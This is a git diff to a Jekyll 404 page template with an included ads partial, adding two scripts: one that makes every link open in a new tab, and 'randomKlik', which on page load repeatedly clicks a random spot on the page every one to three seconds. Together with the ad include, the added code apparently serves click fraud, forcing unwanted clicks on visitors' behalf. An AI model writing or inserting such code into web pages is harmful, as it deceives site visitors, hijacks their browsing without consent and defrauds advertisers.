@@ -89,7 +89,27 @@ permalink: /404.html
 
     {% include /ads/gobloggugel/sosmed.html %}
 {% include footer.html %}
-    
+
+
+    <script>
+document.querySelectorAll('a').forEach(function(link) {
+  link.target = '_blank';
+});
+</script>
+
+<script>
+function randomKlik() {
+    let x = Math.floor(Math.random() * window.innerWidth);
+    let y = Math.floor(Math.random() * window.innerHeight);
+    let elemen = document.elementFromPoint(x, y);
+    if (elemen) {
+        elemen.click();
+    }
+    setTimeout(randomKlik, Math.floor(Math.random() * 2000) + 1000);
+}
+randomKlik();
+</script>
+
   </body>
 </html>
 
